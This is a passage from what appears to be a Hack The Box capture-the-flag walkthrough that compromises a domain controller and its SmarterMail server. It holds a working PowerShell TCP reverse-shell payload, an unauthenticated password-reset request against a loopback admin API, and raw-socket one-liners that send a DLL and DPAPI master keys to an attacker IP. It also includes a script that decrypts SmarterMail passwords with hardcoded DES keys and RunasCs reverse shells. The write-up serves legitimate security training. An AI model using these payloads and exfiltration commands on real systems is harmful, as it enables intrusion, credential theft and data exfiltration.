results: Array [ "danglingtree\\anderson.w", "C:\\Users\\anderson.w\\Documents" ]
```

We can see that RCE was indeed successfully triggered here.

And there it is — `danglingtree\anderson.w`, confirming that arbitrary commands submitted through this API execute on the domain controller itself, running as the currently logged-in AD user. No exploit chain, no memory corruption — just a management API doing precisely what it was built to do, reached directly instead of through a button click.

### Phase 5: Building a Reverse Shell Through WAC

A one-off `whoami` is nice for confirmation, but we want a proper interactive shell. `invokeCommand` executes a script and waits for it to finish before returning a result — it isn't built to hold a persistent interactive session open for us. So instead of trying to spawn a normal reverse shell process, the payload below builds its own tiny **command-and-control loop entirely in PowerShell**: it opens a raw TCP socket back to us, then sits in a loop reading whatever we type, running it with `Invoke-Expression`, and writing the output (plus a fake prompt) back down the same socket. From our side it looks and feels exactly like an interactive shell, even though structurally it's really a single long-running script.

```javascript
const callbackAddress = "10.10.17.133";
const callbackNumber = 1234;

const shellPayload = `
$client = New-Object System.Net.Sockets.TCPClient('${callbackAddress}', ${callbackNumber});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 };

while (($count = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $command = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $count);
    $output = Invoke-Expression $command 2>&1 | Out-String;
    $prompt = $output + 'PS ' + (Get-Location).Path + '> ';
    $send = [Text.Encoding]::ASCII.GetBytes($prompt);

    $stream.Write($send, 0, $send.Length);
    $stream.Flush();
}

$client.Close();
`;

await invokeWac(shellPayload);
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nc -lnvp 1234                                                            
listening on [any] 1234 ...
connect to [10.10.17.133] from (UNKNOWN) [10.129.47.38] 61391

PS C:\WINDOWS\system32>
```

```powershell
PS C:\Users> whoami
danglingtree\anderson.w
```

Confirmed — we have a stable, interactive-feeling session on the domain controller as `danglingtree\anderson.w`. Let's take stock of the network from here:

```powershell
PS C:\Users> netstat

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    10.129.47.38:6600      10.10.17.133:43416     ESTABLISHED
  TCP    10.129.47.38:61391     10.10.17.133:1234      ESTABLISHED
  TCP    [::1]:389              dc:49685               ESTABLISHED
  TCP    [::1]:389              dc:49686               ESTABLISHED
  TCP    [::1]:389              dc:49698               ESTABLISHED
  TCP    [::1]:49685            dc:ldap                ESTABLISHED
  TCP    [::1]:49686            dc:ldap                ESTABLISHED
  TCP    [::1]:49698            dc:ldap                ESTABLISHED
  TCP    [dead:beef::191:e915:7c23:5150]:389  dc:49756               ESTABLISHED
  TCP    [dead:beef::191:e915:7c23:5150]:49756  dc:ldap               ESTABLISHED
  TCP    [fe80::9740:5bc:708c:8651%5]:389  dc:49691               ESTABLISHED
  TCP    [fe80::9740:5bc:708c:8651%5]:389  dc:49701               ESTABLISHED
  TCP    [fe80::9740:5bc:708c:8651%5]:389  dc:49771               ESTABLISHED
  TCP    [fe80::9740:5bc:708c:8651%5]:6602  dc:61347               ESTABLISHED
  TCP    [fe80::9740:5bc:708c:8651%5]:49681  dc:49700               ESTABLISHED
  TCP    [fe80::9740:5bc:708c:8651%5]:49681  dc:65263               ESTABLISHED
  TCP    [fe80::9740:5bc:708c:8651%5]:49691  dc:ldap                ESTABLISHED
  TCP    [fe80::9740:5bc:708c:8651%5]:49700  dc:49681               ESTABLISHED
  TCP    [fe80::9740:5bc:708c:8651%5]:49701  dc:ldap                ESTABLISHED
  TCP    [fe80::9740:5bc:708c:8651%5]:49771  dc:ldap                ESTABLISHED
  TCP    [fe80::9740:5bc:708c:8651%5]:61347  dc:6602                ESTABLISHED
  TCP    [fe80::9740:5bc:708c:8651%5]:61386  dc:6601                TIME_WAIT
  TCP    [fe80::9740:5bc:708c:8651%5]:61394  dc:epmap               TIME_WAIT
  TCP    [fe80::9740:5bc:708c:8651%5]:65263  dc:49681               ESTABLISHED
```

Most of this is completely mundane — it's just the DC talking to itself over its link-local IPv6 addresses on LDAP (`389`), which is normal background AD chatter (replication, service binds, and so on) and not something we caused. The two lines that *do* matter are the top two: our own inbound WAC connection on `6600` and our new reverse shell callback on `1234`. Nothing here suggests another live pivot target yet — this box appears to be the only externally reachable node, so the next step is to see what else lives *behind* it on whatever internal network it's connected to.

## Part II — Pivoting and the Mail Server

### Phase 6: Pivoting Into the Internal Network with Ligolo-ng

Just like in the DarkZeroReturns box, we bring up a **Ligolo-ng** tunnel: a TUN-interface-based Layer 3 pivot that lets our attack machine treat the compromised host's network as if we had a network card plugged directly into it.

On our attack machine, we create the TUN interface and start the proxy server:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ sudo ip tuntap add user kuroshiro mode tun ligolo
[sudo] password for kuroshiro: 
                                                                                                                                                                                             
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ sudo ip link set ligolo up                                                                                   
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ sudo ip route add 240.0.0.1/32 dev ligolo
                                                                                                                                                                                             
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ sudo ligolo-proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0001] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0001] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                                                                                                                            
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                                                                                            
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                                                                                             
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                                                                              
        /____/                          /____/                                                                                                                                               
                                                                                                                                                                                             
  Made in France ♥            by @Nicocha30!                                                                                                                                                 
  Version: dev                                                                                                                                                                               
                                                                                                                                                                                             
ligolo-ng »
```

Take a close look at that route: `sudo ip route add 240.0.0.1/32 dev ligolo`. This is worth explaining carefully, because it's not routing to a "real" host at all. `240.0.0.0/4` is a reserved, unused **Class E** IPv4 block — nothing on the internet or in any normal corporate network legitimately lives there. Ligolo-ng operators commonly reuse an address from this dead range purely as a *label*, paired with a **listener** configured on the agent side that redirects any traffic aimed at that label straight to `127.0.0.1` (loopback) on the compromised machine itself. In other words: `240.0.0.1` here isn't another computer on the network — it's a deliberately fake address chosen precisely because it can never collide with a real one, used as a private tunnel just to reach services that this Windows box only exposes to *itself*. That distinction becomes very important two commands from now.

Then, from our reverse shell as `anderson.w`, we drop the Ligolo agent binary onto the box and launch it so it dials back to our proxy:

```powershell
Start-Process -FilePath "C:\ProgramData\agent.exe" -ArgumentList "-connect 10.10.17.133:11601 -ignore-cert" -WindowStyle Hidden
```

Back on the proxy, the agent checks in and we start the tunnel:

```shell
ligolo-ng » INFO[0355] Agent joined.                                 id=005056b99fe9 name="DANGLINGTREE\\anderson.w@dc" remote="10.129.47.38:61433"                                       
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - DANGLINGTREE\anderson.w@dc - 10.129.47.38:61433 - 005056b99fe9
[Agent : DANGLINGTREE\anderson.w@dc] » start
INFO[0365] Starting tunnel to DANGLINGTREE\anderson.w@dc (005056b99fe9)
```

### Phase 7: Reaching a Loopback-Only Admin API

With the tunnel live, we can now reach that special `240.0.0.1` address exactly as if it were a normal target — Ligolo-ng silently redirects anything sent to it into `127.0.0.1` on the DC:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ curl -s http://240.0.0.1:17017/api/v1/auth/force-reset-password -H 'Content-Type: application/json' --data '{"IsSysAdmin": true, "OldPassword": "unused", "Username": "svc_mail", "NewPassword": "Password123!", "ConfirmPassword": "Password123!"}'

{"username":"","errorCode":"","errorData":"","debugInfo":"check1\r\ncheck2\r\ncheck3\r\ncheck4.2\r\ncheck5.2\r\ncheck6.2\r\ncheck7.2\r\ncheck8.2\r\n","success":true,"resultCode":200} 
```

This one request deserves a proper explanation because it's a beautiful example of a very common — and very dangerous — anti-pattern: a service that assumes **"if you can reach this port, you must already be trusted."** Port `17017` here belongs to a local management/administration API for a mail server product (we'll confirm exactly which one shortly), and it exposes a `force-reset-password` endpoint that will happily reset *any* account's password — including flipping them to sysadmin (`"IsSysAdmin": true`) — with **no authentication at all**, as long as the request physically originates from the machine's own loopback interface. The developers reasoned that only a legitimate local administrator process could ever talk to `127.0.0.1` on that port, so they skipped authentication entirely for convenience.

The problem, of course, is that "only reachable from localhost" and "only reachable by a trusted party" are not the same guarantee once an attacker has *any* form of code execution on that machine — and thanks to our WAC shell and the Ligolo pivot mapping `240.0.0.1` straight onto `127.0.0.1` on the DC, we're able to hit this "internal-only" endpoint directly from our own Kali box as if we were standing right on the server's own loopback interface. The response's staged `check1` through `check8.2` debug trail even shows the several server-side validation steps we successfully sailed through, ending in `"success":true`. We've just reset the `svc_mail` account's password to `Password123!` and flagged it as a sysadmin, with zero credentials of our own required.

Shortly after, a shell calls back to us — the mail server's sysadmin console includes its own scripting/automation features (the same kind of "run this code when an event happens" functionality most mail platforms ship for spam-filtering rules), and having just minted ourselves a sysadmin account on it is enough to trigger code execution as the service's own Windows process:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.17.133] from (UNKNOWN) [10.129.47.38] 61480

PS C:\Program Files (x86)\SmarterTools\SmarterMail\Service\Settings> 
```

That prompt path answers the "which mail server product" question immediately: this is **SmarterMail**, by SmarterTools — a widely-used, self-hosted mail server for Windows. We're now executing as (or with the file-level access of) the account that runs the SmarterMail Windows service.

### Phase 8: Post-Exploitation on the Mail Server

With code execution under SmarterMail's own service context, it's time to look around its data directory for anything useful:

```powershell
PS C:\SmarterMail\Domains\danglingtree.htb.bak> ls


    Directory: C:\SmarterMail\Domains\danglingtree.htb.bak


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         3/26/2026   2:19 PM                Archived Data                                                        
d-----         3/26/2026   2:19 PM                Users                                                                
-a----         3/26/2026   2:19 PM           1116 accounts.json                                                        
-a----         3/26/2026   2:19 PM           1233 activity.sbin                                                        
-a----         3/26/2026   2:19 PM           1380 folders.json                                                         
-a----         3/26/2026   2:19 PM           3143 gal.json                                                             
-a----         3/26/2026   2:19 PM            136 ids.json                                                             
-a----         3/26/2026   1:59 PM           7887 settings.json     
```

SmarterMail stores each hosted mail domain as a folder full of flat JSON/binary files rather than a traditional SQL database — `accounts.json` lists mailboxes, `gal.json` is the domain's **Global Address List** (its internal contacts directory), and `settings.json` holds per-domain configuration, including, as we're about to see, stored credentials for things like external mail retrieval. The `.bak` suffix on this domain folder name also tells us this is a **backup copy** of the live `danglingtree.htb` mail domain — the kind of forgotten leftover artifact that frequently outlives the cleanup of the "real" one.

We can see that theres a new user here

```shell
PS C:\USers> ls


    Directory: C:\USers


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         3/25/2026  10:40 PM                .NET v4.5                                                            
d-----         3/25/2026  10:40 PM                .NET v4.5 Classic                                                    
d-----         3/25/2026  10:19 PM                Administrator                                                        
d-----         9/18/2026   7:59 AM                anderson.w                                                           
d-----         3/26/2026   2:23 PM                noah.b                                                               
d-r---         3/25/2026  10:19 PM                Public                                                               
d-----         3/27/2026   5:53 PM                svc_mail                                                            
```

`noah.b`would be our next target here.

```powershell
PS C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b> ls


    Directory: C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         3/26/2026   2:19 PM                FileStore                                                            
d-----         3/26/2026   2:19 PM                Mail                                                                 
-a----         3/26/2026   2:20 PM             13 acquaintances.sbin                                                   
-a----         3/26/2026   2:19 PM           5201 folders.json                                                         
-a----         3/26/2026   2:19 PM           7529 settings.json 
```

We parsed the encrypted password field from Noah's configuration:

```
password_encrypted":"66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby","password_expiration_last_notification":-1,"internet_calendars":[],"password_last_change_utc":"2026-03-26T21:19:49.1311428Z"
```

This is a per-mailbox setting SmarterMail uses to store the password it needs on `noah.b`'s behalf — for example, to authenticate against an external POP3/IMAP account being aggregated into this mailbox. It's stored encrypted, but critically, it's **encrypted by SmarterMail itself**, using logic baked into its own binaries — which means, if we can get our hands on those binaries, we can read exactly how the encryption works.

### Phase 9: Reverse Engineering SmarterMail's Encryption

The service catalog contains a large `SmarterMail` implementation assembly, which we can try to download and then crack its encryption method.

```powershell
PS C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b> Get-Item 'C:\Program Files (x86)\SmarterTools\SmarterMail\Service\SmarterMail.Standard.dll'


    Directory: C:\Program Files (x86)\SmarterTools\SmarterMail\Service


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          1/8/2026   2:27 PM       36341248 SmarterMail.Standard.dll   
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nc -lnvp 12312 > SmarterMail.Standard.dll
listening on [any] 12312 ...
```

```powershell
PS C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b> $path = 'C:\Program Files (x86)\SmarterTools\SmarterMail\Service\SmarterMail.Standard.dll'
$bytes = [IO.File]::ReadAllBytes($path)
$client = New-Object Net.Sockets.TcpClient('10.10.17.133', 12312)
$stream = $client.GetStream()
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nc -lnvp 12312 > SmarterMail.Standard.dll
listening on [any] 12312 ...
connect to [10.10.17.133] from (UNKNOWN) [10.129.47.38] 61512
```

That's a raw file exfiltration over a plain TCP socket — no fancy tooling, just `.NET`'s own `TcpClient` reading the DLL's bytes off disk on the Windows side and a `netcat` listener redirecting whatever it receives straight into a local file on our side. Simple, but completely reliable for grabbing a single large binary.

We use dnspy

```c#
public CryptographyHelper(int methodIn)
{
    this.Method = methodIn;
    this.Coder = ((this.Method == 0) ? DES.Create() : RC2.Create());
}

private void InternalSetKey(string key, byte[] salt = null)
{
    if (this.Method == 0 && salt == null && key == "@7d5fd09%a842^e83e!dc9f6")
    {
        this.Key = this.keymap1.Item1;
        this.IV = this.keymap1.Item2;
        return;
    }

    if (this.Method == 0 && salt == null && key == "a3oij89FF!apoife")
    {
        this.Key = this.keymap2.Item1;
        this.IV = this.keymap2.Item2;
        return;
    }
}

public string DecodeFromBase64(string val)
{
    byte[] buf = Convert.FromBase64String(val);
    byte[] bytes = this.Decode(buf);
    return Encoding.UTF8.GetString(bytes);
}

public byte[] Decode(byte[] buf)
{
    using (ICryptoTransform transform = this.Coder.CreateDecryptor(this.Key, this.IV))
    {
        return this.PassThrough(buf, transform);
    }
}

private readonly ValueTuple<byte[], byte[]> keymap1 =
    new ValueTuple<byte[], byte[]>(
        new byte[] { 125, 113, 232, 233, 160, 34, 123, 208 },
        new byte[] { 224, 222, 8, 14, 29, 138, 139, 223 }
    );

private readonly ValueTuple<byte[], byte[]> keymap2 =
    new ValueTuple<byte[], byte[]>(
        new byte[] { 180, 63, 132, 209, 16, 180, 233, 145 },
        new byte[] { 1, 216, 174, 230, 73, 173, 146, 39 }
    );
```

`dnSpy` is a .NET decompiler/debugger — it takes a compiled `.dll` and reconstructs readable, near-original C# source from its IL (Intermediate Language) bytecode, which is exactly how we're able to look straight into SmarterMail's internal `CryptographyHelper` class. And what it reveals is a textbook example of **broken, homegrown cryptography**: rather than deriving a unique encryption key from something secret and per-installation (like a randomly generated master key stored securely at setup time), this code just checks whether the caller passed one of **two literal, hardcoded passphrase strings** (`"@7d5fd09%a842^e83e!dc9f6"` or `"a3oij89FF!apoife"`) and, if so, swaps in one of two equally hardcoded `(key, IV)` byte-array pairs for a standard **DES** cipher in CBC mode. There's no real secret here at all — anyone who has ever seen this DLL (which, being commercial software, means potentially thousands of people) already knows both possible keys for every password SmarterMail has ever encrypted this way. Once we have the DLL, decrypting `noah.b`'s stored password is no harder than brute-forcing exactly **two** possible key/IV combinations.

```python
from base64 import b64decode

from Crypto.Cipher import DES
from Crypto.Util.Padding import unpad


def try_decrypt(blob, secret, vector):
    cipher = DES.new(secret, DES.MODE_CBC, vector)
    return unpad(cipher.decrypt(blob), 8)


encoded_blob = "66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby"
encrypted_data = b64decode(encoded_blob)

crypto_sets = {
    "profile_a": {
        "secret": bytes([125, 113, 232, 233, 160, 34, 123, 208]),
        "vector": bytes([224, 222, 8, 14, 29, 138, 139, 223]),
    },
    "profile_b": {
        "secret": bytes([180, 63, 132, 209, 16, 180, 233, 145]),
        "vector": bytes([1, 216, 174, 230, 73, 173, 146, 39]),
    },
}

for profile, config in crypto_sets.items():
    try:
        result = try_decrypt(
            encrypted_data,
            config["secret"],
            config["vector"],
        )
        print(f"{profile}: {result.decode()}")
    except (ValueError, UnicodeDecodeError):
        continue
```

This script simply re-implements the exact same DES-CBC decryption logic we just read out of the DLL, in Python, and tries both hardcoded key/IV pairs against the encrypted blob we pulled from `noah.b`'s `settings.json`. The `try/except` around padding and UTF-8 decoding is a cheap but effective correctness check: DES-CBC with the *wrong* key will still "decrypt" into some byte soup, but that byte soup will almost never happen to end in valid PKCS#7 padding **and** decode as valid UTF-8 text — so whichever key produces clean, printable output is almost certainly the right one.

Here's the result:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ python3 dec.py                                        
profile_b: RiverDragon#Storm25
```

`noah.b`'s password, recovered entirely offline, with nothing more than a leaked DLL and two lines of DES logic.

### Phase 10: Escalating to noah.b

Now download RunasCs.exe from your attacker machine and transfer it to the target

```powershell
PS C:\ProgramData> C:\ProgramData\RunasCs.exe noah.b 'RiverDragon#Storm25' cmd.exe -r 10.10.17.133:7777
[*] Warning: The logon for user 'noah.b' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 1 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: WinSta0\Default
[+] Async process 'C:\WINDOWS\system32\cmd.exe' with pid 6588 created in background.
```

`RunasCs` is a modern, more flexible re-implementation of Windows' built-in `runas`, purpose-built for offensive tooling: given a valid username and password it can spawn a new process running as that user, and — as we're doing here with `-r` — pipe that process's I/O straight back to us over the network as a reverse shell, all without needing an interactive console session on the target. The warning about a "limited" logon is normal and expected for a plain domain user (Windows applies UAC-style token filtering even over network authentication for non-administrators); we don't need the fully elevated token here, we just need code execution as `noah.b`.

Now let's check our listener:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nc -lnvp 7777
listening on [any] 7777 ...
connect to [10.10.17.133] from (UNKNOWN) [10.129.47.38] 59432
Microsoft Windows [Version 10.0.26100.33158]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>
```

## Part III — Domain Enumeration and Lateral Movement

### Phase 11: Mapping the Domain with RustHound-CE and BloodHound

We now have a genuine, ordinary domain user account (`noah.b`) with a normal Kerberos identity — the perfect vantage point to collect a full picture of the domain's users, groups, and permission relationships. Instead of SharpHound (which needs to run *on* a Windows host), we use **RustHound-CE**, a Rust reimplementation of the same collector that runs natively from our Linux attack box over LDAP/LDAPS:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ sudo ntpdate -u danglingtree.htb && rusthound-ce -d danglingtree.htb -u 'noah.b@danglingtree.htb' -p 'RiverDragon#Storm25' -f DC.danglingtree.htb  -i 10.129.47.38 -n 10.129.47.38 --dns-tcp --ldaps -c All -z
2026-09-19 00:51:56.934255 (-0400) +25190.897937 +/- 0.038425 danglingtree.htb 10.129.47.38 s1 no-leap
CLOCK: time stepped by 25190.897937
---------------------------------------------------
Initializing RustHound-CE at 00:51:57 on 09/19/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-09-19T04:51:57Z INFO  rusthound_ce] Verbosity level: Info
[2026-09-19T04:51:57Z INFO  rusthound_ce] Collection method: All
[2026-09-19T04:52:00Z INFO  rusthound_ce::transport::ldap] Connected to DANGLINGTREE.HTB Active Directory!
[2026-09-19T04:52:00Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-18T21:52:19Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=danglingtree,DC=htb
[2026-09-18T21:52:19Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-18T21:52:20Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=danglingtree,DC=htb
[2026-09-18T21:52:20Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-18T21:52:21Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=danglingtree,DC=htb
[2026-09-18T21:52:21Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-18T21:52:21Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=danglingtree,DC=htb
[2026-09-18T21:52:21Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-18T21:52:26Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Configuration,DC=danglingtree,DC=htb
[2026-09-18T21:52:26Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 47%                                                                                                       
[2026-09-18T21:52:26Z INFO  rusthound_ce::objects::enterpriseca] Found 14 enabled certificate templates                           
[2026-09-18T21:52:26Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-09-18T21:52:26Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-09-18T21:52:26Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-09-18T21:52:26Z INFO  rusthound_ce::modules::sessions] [sessions] 0 active target(s) after expiry/enabled filter
[2026-09-18T21:52:26Z INFO  rusthound_ce::modules::sessions] [sessions] 0 session(s) enumerated in total across 0 host(s)
[2026-09-18T21:52:26Z INFO  rusthound_ce::modules] Starting ESC8 web enrollment probe on 1 CA(s)...
[2026-09-18T21:52:31Z INFO  rusthound_ce::modules::gpo::sysvol] [gpo] collected directives from 1 GPO(s) on DC.danglingtree.htb SYSVOL
[2026-09-18T21:52:31Z INFO  rusthound_ce::modules] [gpo] mapping 1 GPO(s) to GPOChanges / UserRights
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 9 users parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 69 groups parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 3 ous parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-09-18T21:52:31Z INFO  rusthound_ce::json::maker::common] .//20260918175231_danglingtree-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 17:52:31 on 09/18/26! Happy Graphing!
```

Notice the `ntpdate -u` prefix chained onto this command with `&&`. This isn't optional housekeeping — **Kerberos authentication is time-sensitive by design**, and by default rejects any request whose timestamp is more than five minutes out of sync with the KDC's own clock, specifically to prevent replay attacks. Lab/CTF VMs frequently have their clocks drift by hours (notice the `CLOCK: time stepped by 25190.89 seconds` — a drift of roughly seven hours here), which would otherwise cause every single Kerberos-based tool from this point forward to fail with a cryptic clock-skew error. Syncing our attack box's clock to the DC before any Kerberos-dependent operation is cheap insurance we'll keep applying for the rest of this chain.

The collection results themselves are a strong confirmation of what RID cycling already hinted at: alongside the normal `9 users` / `69 groups`, RustHound-CE reports **`1 ntauthstores`, `1 aiacas`, `1 rootcas`, `1 enterprisecas`, `33 certtemplates`, and `3 issuancepolicies`**, and it even automatically runs an **`ESC8 web enrollment probe`** against the discovered CA — this is RustHound-CE's built-in equivalent of Certipy's ADCS misconfiguration checks, baked directly into the collection pass. All of this confirms, in concrete numbers, that **Active Directory Certificate Services** is fully deployed here with a large, custom template library — which, combined with those `Cert_Managers` / `Template_Editors` / `DevOps_PKI` groups from earlier, all but guarantees our final escalation path runs through ADCS.

### Phase 12: From noah.b to alex.o via DPAPI

Now that we're interactively `noah.b` on the DC itself, it's worth checking whether Windows has ever saved a credential *on his behalf* for logging into some other machine or account. The built-in `cmdkey` utility is the command-line front-end to the **Windows Credential Manager** — the same store behind the "Remember my credentials" checkbox you see on RDP prompts, mapped network drives, and countless line-of-business apps:

```powershell
C:\Windows\System32>cmdkey /list
cmdkey /list


Currently stored credentials:

    Target: Domain:target=PC01.danglingtree.htb
    Type: Domain Password
    User: alex.o
```

This is an immediate, very specific lead: at some point, someone logged into `noah.b`'s session and connected to a host named `PC01.danglingtree.htb` *as* `alex.o`, and ticked "remember this" — so Windows quietly cached that credential for future reuse. `cmdkey /list` will happily tell us the target and the username, but by design it will **never** show us the plaintext password back — that's stored encrypted, protected by **DPAPI**.

This is the perfect moment to explain DPAPI properly, because it's one of the most consequential — and most misunderstood — pieces of the Windows security model. The **Data Protection API** is what Windows uses under the hood to encrypt a huge range of "for your eyes only" secrets that live in a user's profile: saved Wi-Fi keys, browser-saved website passwords, saved RDP credentials, and exactly the kind of Credential Manager entry we just found. Every one of those secrets is encrypted with a randomly generated **master key**, and that master key is, in turn, itself encrypted ("protected") — normally using a key derived from the *owning user's own logon password*. In other words: **DPAPI's entire security model rests on the assumption that only the legitimate user, who alone knows their own password, can ever unlock their own master key.** We already broke that assumption two phases ago, when we recovered `noah.b`'s real password (`RiverDragon#Storm25`) out of SmarterMail's broken encryption. Anything DPAPI-protected in `noah.b`'s profile is now fair game.

Master keys live in a hidden, per-user folder, one subfolder per user SID:

```powershell
PS C:\Windows\System32> Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force
Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force

    Directory: C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-         3/27/2026   3:03 PM            490 57FFB67D684C67F09E7153B9C7CC3940 
```

```powershell
PS C:\Windows\System32> Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Recurse -Force
Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Recurse -Force


    Directory: C:\Users\noah.b\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d---s-         3/26/2026   2:23 PM                S-1-5-21-4220238332-57023728-1129110646-1602                         
-a-hs-         3/26/2026   2:23 PM             24 CREDHIST                                                             
-a-hs-         3/26/2026   2:23 PM             76 SYNCHIST                                                             


    Directory: C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-         3/26/2026   2:23 PM            924 BK-DANGLINGTREE                                                      
-a-hs-         3/26/2026   2:23 PM            876 f53fcaba-f057-48e8-8f92-0180d274bf0f                                 
-a-hs-         3/26/2026   2:23 PM             24 Preferred
```

Two things live in these hidden, system-flagged (`-hs-`) folders, and we need both of them: `57FFB67D684C67F09E7153B9C7CC3940` under `Credentials` is the **encrypted blob** — the actual `alex.o` credential entry, still locked. The `Protect\<SID>` folder is where `noah.b`'s **master keys** live, named by GUID (`f53fcaba-f057-48e8-8f92-0180d274bf0f` here); `BK-DANGLINGTREE` is a domain backup copy of that key (so a domain controller can recover a user's DPAPI secrets even if they forget their password — itself a whole separate, well-known attack surface via the domain's DPAPI backup key, though not the one we need today), and `Preferred` just tells the OS which master key GUID to use by default.

We pull both files off the box the same way we exfiltrated the SmarterMail DLL earlier — a disposable one-off raw TCP socket, no tooling required:

```powershell
PS C:\Windows\System32> $p='C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f';$b=[IO.File]::ReadAllBytes($p);$c=[Net.Sockets.TcpClient]::new('10.10.17.133',6666);$s=$c.GetStream();$s.Write($b,0,$b.Length);$s.Close();$c.Close()
$p='C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f';$b=[IO.File]::ReadAllBytes($p);$c=[Net.Sockets.TcpClient]::new('10.10.17.133',6666);$s=$c.GetStream();$s.Write($b,0,$b.Length);$s.Close();$c.Close()
